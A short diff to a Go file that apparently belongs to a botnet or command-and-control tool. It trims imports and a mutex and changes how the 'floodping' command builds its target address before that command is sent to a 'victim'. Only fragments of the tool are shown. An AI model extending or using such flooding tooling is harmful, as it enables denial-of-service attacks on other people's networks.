@@ -1,18 +1,14 @@
 package main
 
 import (
-	//"bytes"
 	"encoding/base64"
-	//"encoding/json"
 	"fmt"
-	//"net/http"
 	"os"
 	"path/filepath"
-	"sync"
+	
 	"time"
 )
 
-var clientTreeMutex sync.Mutex
 
 // edit later
 var options = []option{
@@ -87,7 +83,8 @@ func floodping(params ...interface{}) {
 	}
 
 	hash := args[0]
-	ipport := args[1] + ":" + args[2]
+	//ipport := args[1] + ":" + args[2]
+	ipport := args[1]
 
 	cmd := VictimCommand{
 		Commandytype: "floodping",
